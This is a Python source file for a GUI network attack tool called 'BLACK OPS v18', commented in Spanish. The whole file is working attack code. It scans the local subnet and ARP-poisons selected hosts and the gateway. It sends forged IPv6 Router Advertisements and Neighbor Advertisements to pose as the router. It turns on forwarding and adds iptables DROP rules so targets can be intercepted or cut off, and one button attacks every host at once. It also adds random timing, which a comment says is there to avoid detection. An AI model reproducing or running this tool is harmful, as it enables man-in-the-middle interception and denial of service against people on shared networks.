#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import multiprocessing
from queue import Empty
import time
import random
import subprocess
import os
import sys
import re
import signal

from scapy.all import (ARP, Ether, send, srp, AsyncSniffer, 
                       DNS, DNSQR, IP, UDP, DNSRR, conf, 
                       get_if_addr, get_if_hwaddr,
                       IPv6, ICMPv6ND_RA, ICMPv6ND_NS, ICMPv6ND_NA,
                       ICMPv6NDOptSrcLLAddr, ICMPv6NDOptPrefixInfo)

conf.verb = 0

# ==================== MOTOR DE RESPUESTA ACTIVA IPv6 ====================

def motor_ipv6_apex(log_queue, control_event, net_info):
    """
    Sniffer ICMPv6: Responde a Neighbor Solicitations y envía Fake RAs.
    """
    mac_l = net_info['mac_l']
    ll_v6 = net_info['ll_v6']
    
    # Paquete RA Falso (Simula ser el Router)
    ra_pkt = (Ether(src=mac_l, dst="33:33:00:00:00:01")/
              IPv6(src=ll_v6, dst="ff02::1")/
              ICMPv6ND_RA(chlim=64, M=0, O=1, routerlifetime=1800)/
              ICMPv6NDOptSrcLLAddr(lladdr=mac_l)/
              ICMPv6NDOptPrefixInfo(prefix="2001:db8:1::", prefixlen=64, L=1, A=1))

    def ndp_callback(pkt):
        # Captura solicitudes de vecinos (¿Quién es el router?)
        if pkt.haslayer(ICMPv6ND_NS):
            target_ip = pkt[ICMPv6ND_NS].tgt
            # Si preguntan por el gateway o una IP que queremos interceptar
            try:
                na_resp = (Ether(src=mac_l, dst=pkt[Ether].src)/
                           IPv6(src=target_ip, dst=pkt[IPv6].src)/
                           ICMPv6ND_NA(tgt=target_ip, R=1, S=1, O=1)/
                           ICMPv6NDOptSrcLLAddr(lladdr=mac_l))
                send(na_resp, verbose=0, count=2)
            except Exception as e:
                log_queue.put(f"NDP Error: {e}")

    try:
        # Sniffer específico para ICMPv6
        sniffer = AsyncSniffer(filter="icmp6", prn=ndp_callback, store=0)
        sniffer.start()
        
        while not control_event.is_set():
            # Envío de RAs con Rate Limiting Adaptativo
            send(ra_pkt, verbose=0)
            # Jitter: Evita detección por patrones fijos
            time.sleep(random.uniform(2.0, 5.0))
            
        if sniffer.running: sniffer.stop()
    except Exception as e:
        log_queue.put(f"FATAL IPv6 ENGINE: {e}")

# ==================== MOTOR IPv4 DUAL-STACK ====================

def motor_ataque_v18(targets_queue, log_queue, control_event, net_info):
    try:
        ip_gw, mac_l, mac_gw = net_info['gw'], net_info['mac_l'], net_info['mac_gw']
        active_targets = {}

        while not control_event.is_set():
            try:
                while True:
                    ip, mac, active = targets_queue.get_nowait()
                    if active: active_targets[ip] = mac
                    else: active_targets.pop(ip, None)
            except Empty: pass

            if active_targets:
                for ip, mac in active_targets.items():
                    p_list = [
                        ARP(op=2, pdst=ip, hwdst=mac, psrc=ip_gw, hwsrc=mac_l),
                        ARP(op=2, pdst=ip_gw, hwdst=mac_gw, psrc=ip, hwsrc=mac_l)
                    ]
                    send(p_list, verbose=0, count=2, inter=0.005)
            
            time.sleep(random.uniform(0.8, 1.2))
    except Exception as e:
        log_queue.put(f"FATAL IPv4 ENGINE: {e}")

# ==================== INTERFAZ DE COMANDO ====================

class AppMuro:
    def __init__(self, root):
        self.root = root
        self.root.title("BLACK OPS v18 - APEX EDITION")
        self.root.geometry("1100x850")
        self.root.configure(bg="#050505")
        
        self.targets = {}
        self.queue_atk = multiprocessing.Queue()
        self.log_queue = multiprocessing.Queue()
        self.control_event = multiprocessing.Event()
        self.is_running = True

        if self.init_network():
            self.setup_ui()
            self.start_engines()
            self.update_logs() 
        else:
            messagebox.showerror("Error", "Fallo de inicialización Dual-Stack.")
            sys.exit(1)

    def init_network(self):
        try:
            # Detección Dual-Stack
            route = subprocess.check_output(["ip", "route", "show", "default"]).decode()
            m = re.search(r"default via ([\d\.]+) dev ([\w\.-]+)", route)
            if not m: return False
            gw, iface = m.group(1), m.group(2)
            
            # Obtención IPv6 Link-Local segura
            v6_cmd = subprocess.check_output(["ip", "-6", "addr", "show", "dev", iface, "scope", "link"]).decode()
            v6_match = re.search(r"inet6 (fe80::[\da-f:]+)", v6_cmd)
            ll_v6 = v6_match.group(1) if v6_match else None

            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gw), timeout=2, verbose=0)
            if not ans: return False
            
            # Habilitar forwarding y limpiar caché inicial
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
            subprocess.run(["sysctl", "-w", "net.ipv6.conf.all.forwarding=1"], capture_output=True)
            subprocess.run(["ip", "-6", "neigh", "flush", "all"], capture_output=True)

            self.net_info = {'gw': gw, 'iface': iface, 'mac_l': get_if_hwaddr(iface), 
                             'ip_l': get_if_addr(iface), 'mac_gw': ans[0][1].hwsrc, 'll_v6': ll_v6}
            return True
        except Exception: return False

    def setup_ui(self):
        # Header Informativo
        header_text = f"IFACE: {self.net_info['iface']} | IPv4: {self.net_info['ip_l']} | IPv6: {'ACTIVO' if self.net_info['ll_v6'] else 'N/D'}"
        tk.Label(self.root, text=header_text, bg="#1a1a1a", fg="#00ff00", font=("Consolas", 10)).pack(fill="x")
        tk.Label(self.root, text="NETWORK APEX v18 // DUAL-STACK SPOOFER", bg="#b30000", fg="white", font=("Impact", 20)).pack(fill="x")
        
        f_btns = tk.Frame(self.root, bg="#050505", pady=10)
        f_btns.pack()
        tk.Button(f_btns, text="🔍 SCAN RED", command=self.scan, width=15, bg="#222", fg="#0f0").pack(side="left", padx=5)
        tk.Button(f_btns, text="🔥 APEX ATTACK", command=self.attack_all, width=15, bg="#440000", fg="white").pack(side="left", padx=5)
        tk.Button(f_btns, text="🧹 FLUSH CACHE", command=self.flush_network, width=15, bg="#000044", fg="white").pack(side="left", padx=5)

        self.tree = ttk.Treeview(self.root, columns=("IP", "MAC", "PROTO"), show="headings", height=15)
        for c in ("IP", "MAC", "PROTO"): self.tree.heading(c, text=c)
        self.tree.pack(fill="both", expand=True, padx=15)
        self.tree.bind("<Double-1>", lambda e: self.toggle_selected())

        self.log_box = scrolledtext.ScrolledText(self.root, height=10, bg="black", fg="#0f0", font=("Consolas", 9))
        self.log_box.pack(fill="x", padx=15, pady=10)

    def flush_network(self):
        subprocess.run(["ip", "-6", "neigh", "flush", "all"], capture_output=True)
        subprocess.run(["ip", "neigh", "flush", "all"], capture_output=True)
        self.log("Caché de vecinos de red limpiada (NDP/ARP Flush).")

    def log(self, msg):
        if self.is_running:
            self.log_box.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {msg}\n")
            self.log_box.see(tk.END)

    def update_logs(self):
        if not self.is_running: return
        try:
            while True:
                msg = self.log_queue.get_nowait()
                self.log(f"ENGINE: {msg}")
        except Empty: pass
        if self.root.winfo_exists(): self.root.after(500, self.update_logs)

    def start_engines(self):
        self.p_ipv4 = multiprocessing.Process(target=motor_ataque_v18, args=(self.queue_atk, self.log_queue, self.control_event, self.net_info))
        self.p_ipv6 = multiprocessing.Process(target=motor_ipv6_apex, args=(self.log_queue, self.control_event, self.net_info))
        self.p_ipv4.daemon = True
        self.p_ipv6.daemon = True
        self.p_ipv4.start(); self.p_ipv6.start()

    def scan(self):
        self.log("Escaneando red local...")
        self.targets.clear()
        for i in self.tree.get_children(): self.tree.delete(i)
        red = self.net_info['gw'] + "/24"
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=red), timeout=2, verbose=0)
            for _, rcv in ans:
                if rcv.psrc != self.net_info['ip_l']:
                    self.targets[rcv.psrc] = {'mac': rcv.hwsrc, 'active': False}
                    self.tree.insert("", "end", iid=rcv.psrc, values=(rcv.psrc, rcv.hwsrc, "LIVE (Dual)"))
        except Exception as e: self.log(f"Error Scan: {e}")

    def toggle_selected(self):
        sel = self.tree.selection()
        if sel: self.apply_toggle(sel[0])

    def apply_toggle(self, ip):
        target = self.targets.get(ip)
        if not target: return
        state = not target['active']
        target['active'] = state
        self.tree.item(ip, values=(ip, target['mac'], "POISONING" if state else "LIVE (Dual)"))
        self.queue_atk.put((ip, target['mac'], state))
        
        # Bloqueo Iptables para forzar MitM
        act = "-I" if state else "-D"
        subprocess.run(["iptables", act, "FORWARD", "-s", ip, "-j", "DROP"], capture_output=True)
        self.log(f"Objetivo {ip} {'interceptado' if state else 'liberado'}.")

    def attack_all(self):
        for ip in list(self.targets.keys()):
            if not self.targets[ip]['active']: self.apply_toggle(ip)

    def restore_all(self):
        subprocess.run(["iptables", "-F"], capture_output=True)
        self.log("Reglas de firewall restauradas.")

    def on_close(self):
        self.is_running = False
        self.control_event.set()
        for p in [self.p_ipv4, self.p_ipv6]:
            if p.is_alive(): os.kill(p.pid, signal.SIGTERM)
        self.restore_all()
        self.root.destroy()

if __name__ == "__main__":
    if os.geteuid() != 0: 
        print("SUDO REQUERIDO PARA MANIPULACIÓN ICMPv6/NDP."); sys.exit(1)
    
    multiprocessing.freeze_support()
    root = tk.Tk()
    app = AppMuro(root)
    root.protocol("WM_DELETE_WINDOW", app.on_close)
    root.mainloop()
